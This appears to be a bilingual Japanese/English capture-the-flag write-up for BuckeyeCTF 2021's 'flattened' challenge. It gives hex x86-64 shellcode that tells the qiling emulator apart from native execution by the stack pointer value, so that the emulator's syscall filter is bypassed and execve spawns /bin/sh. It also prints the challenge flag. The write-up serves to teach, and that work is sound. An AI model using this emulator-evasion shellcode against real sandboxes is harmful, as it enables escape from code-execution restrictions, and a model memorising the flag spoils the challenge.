@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>flattened (BuckeyeCTF 2021) Writeup</title>
+<script src="../../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>flattened</h1>
+<span class="language-selector-ja">
+<p>
+TCPサーバの接続情報と、サーバのファイル一式が与えられた。<br>
+<code>chall.py</code> を読むと、以下の処理をしていることが読み取れた。
+</p>
+<ol>
+<li>x86-64の機械語を16進数で入力させる。</li>
+<li>エミュレータ qiling を用い、入力された機械語を実行する。
+<ul>
+<li>1 (write) および 0x3c (exit) 以外のシステムコールが実行されたら、終了する。</li>
+<li>実行された命令のうち、ジャンプや分岐以外の命令を記録する。</li>
+</ul></li>
+<li>記録された命令をもとにELFを作成し、実行する。
+</ol>
+<p>
+そこで、<common-tool data-lang="ja">NASM</common-tool>を用いて機械語を作成し、<common-tool data-lang="ja">CyberChef</common-tool>で16進数に変換することにした。
+</p>
+</span>
+<span class="language-selector-en">
+<p>
+Information to connect to a TCP server, and the files for the server were given.<br>
+Reading <code>chall.py</code>, I found it doing this process:
+</p>
+<ol>
+<li>Accept a line of x86-64 machine code in hexadecimal.</li>
+<li>Execute the machine code entered on an emulator qiling.
+<ul>
+<li>Exit when system calls other than 1 (write) and 0x3c (exit) are executed.</li>
+<li>Record executed instructions other than jump and branch instructions.</li>
+</ul></li>
+<li>Create an ELF from the recorded instructions and execute that.</li>
+</ol>
+<p>
+Seeing this, I decided to create machine code using <common-tool data-lang="en">NASM</common-tool> and convert that to hexadecimal using <common-tool data-lang="en">CyberChef</common-tool>.
+</p>
+</span>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)">To Hex - CyberChef</a></p>
+
+<p class="language-selector-ja">
+まず、以下のコードを用い、実行中のプログラムカウンタを出力してみることを試みた。
+</p>
+<p class="language-selector-en">
+Firstly, I tried to print the value of the program counter in execution using this program:
+</p>
+<p><a href="test1.asm" class="code-link" data-collapse="true">test1.asm</a></p>
+<code-block data-extension="txt">
+488d05000000005031ff4889e6ba04000000b8010000000f05b83c00000031ff0f05
+</code-block>
+
+<span class="language-selector-ja">
+<p>
+しかし、<code>UnicodeDecodeError</code> というエラーが出てしまった。
+</p><p>
+そこで、簡単な実装でアドレスを文字で表現するため、16進数のそれぞれの桁をa～pのアルファベットで表現する以下のコードを実行した。
+</p>
+</span>
+<span class="language-selector-en">
+<p>
+Unfortunately, this resulted in an error <code>UnicodeDecodeError</code>.
+</p><p>
+Seeing this, to express the address using characters in a simple implementation, I executed this code to express each hexadecimal digits using alphabets from a to p.
+</p>
+</span>
+<p><a href="test2.asm" class="code-link" data-collapse="true">test2.asm</a></p>
+<code-block data-extension="txt">
+48b861616161616161616a0a5050488d15ebffffff88d0240f0044240f48c1ea0488d0240f0044240e48c1ea0488d0240f0044240d48c1ea0488d0240f0044240c48c1ea0488d0240f0044240b48c1ea0488d0240f0044240a48c1ea0488d0240f0044240948c1ea0488d0240f0044240848c1ea0488d0240f0044240748c1ea0488d0240f0044240648c1ea0488d0240f0044240548c1ea0488d0240f0044240448c1ea0488d0240f0044240348c1ea0488d0240f0044240248c1ea0488d0240f0044240148c1ea0488d0240f000424bf010000004889e6ba11000000b8010000000f05b83c00000031ff0f05
+</code-block>
+
+<p class="language-selector-ja">
+結果、qiling による実行とELFによる実行でともに <code>aaaaaaaaabbppaaa</code> (<code>00000000011ff000</code>) と出力され、判別はできなそうだった。<br>
+なお、出力のデコードは以下のRecipeで行える。
+</p>
+<p class="language-selector-en">
+As a result, it printed <code>aaaaaaaaabbppaaa</code> (<code>00000000011ff000</code>) in both of executions on qiling and ELF, and it didn't look distinguishable.<br>
+I used this Recipe to decode the output:
+</p>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=Substitute('a-p','0-9a-f')&amp;input=YWFhYWFhYWFhYmJwcGFhYQ">Substitute - CyberChef</a></p>
+
+<p class="language-selector-ja">
+次に、同様にスタックポインタの値を出力してみた。
+</p>
+<p class="language-selector-en">
+Then, I tried printing the value of the stack pointer in the same way:
+</p>
+<p><a href="test3.asm" class="code-link" data-collapse="true">test3.asm</a></p>
+<code-block data-extension="txt">
+48b861616161616161616a0a50504889e288d0240f0044240f48c1ea0488d0240f0044240e48c1ea0488d0240f0044240d48c1ea0488d0240f0044240c48c1ea0488d0240f0044240b48c1ea0488d0240f0044240a48c1ea0488d0240f0044240948c1ea0488d0240f0044240848c1ea0488d0240f0044240748c1ea0488d0240f0044240648c1ea0488d0240f0044240548c1ea0488d0240f0044240448c1ea0488d0240f0044240348c1ea0488d0240f0044240248c1ea0488d0240f0044240148c1ea0488d0240f000424bf010000004889e6ba11000000b8010000000f05b83c00000031ff0f05
+</code-block>
+
+<span class="language-selector-ja">
+<p>
+すると、qiling による実行では <code>aaaaaaaaabbpopoi</code> (<code>00000000011fefe8</code>)、ELFによる実行では <code>aaaahppoodlfimki</code> (<code>00007ffee3b58ca8</code>) と出力され、差が見つかった。
+</p><p>
+これを利用し、小さいスタックポインタを用いた qiling による実行ではシステムコール <code>60 - 0 = 60</code> (exit) を実行し、<br>
+大きいスタックポインタを用いたELFによる実行ではシステムコール <code>60 - 1 = 59</code> (execve) を実行する、以下のコードを実行した。
+</p>
+</span>
+<span class="language-selector-en">
+<p>
+As a result, the execution on qiling printed <code>aaaaaaaaabbpopoi</code> (<code>00000000011fefe8</code>) and the execution using ELF printed <code>aaaahppoodlfimki</code> (<code>00007ffee3b58ca8</code>). Here is a difference!
+</p><p>
+Based on this, I executed this program to execute a system call <code>60 - 0 = 60</code> (exit) on qiling, which uses a small value of the stack pointer,<br>
+and a system call <code>60 - 1 = 59</code> (execve) on ELF, which uses a large value of the stack pointer.
+</p>
+</span>
+<p><a href="payload.asm" class="code-link" data-collapse="true">payload.asm</a></p>
+<code-block data-extension="txt">
+48b82f62696e2f73680050b83c0000004889e731f631d24889e148c1e92e29c80f05
+</code-block>
+
+<p class="language-selector-ja">
+このプログラムを実行させると、シェルの操作が可能になった。<br>
+<code>ls -al</code> コマンドを実行すると、ファイル <code>flag.txt</code> があることがわかった。<br>
+<code>cat flag.txt</code> コマンドを実行すると、flagが得られた。
+</p>
+<p class="language-selector-en">
+Executing this program made the shell available.<br>
+I found a file <code>flag.txt</code> by executing a command <code>ls -al</code>.<br>
+I obtained the flag by executing a command <code>cat flag.txt</code>.
+</p>
+
+<div class="flag">buckeye{execve_plu5_0n3_1s_exit}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">BuckeyeCTF 2021</a>
+</p>
+</body>
+</html>
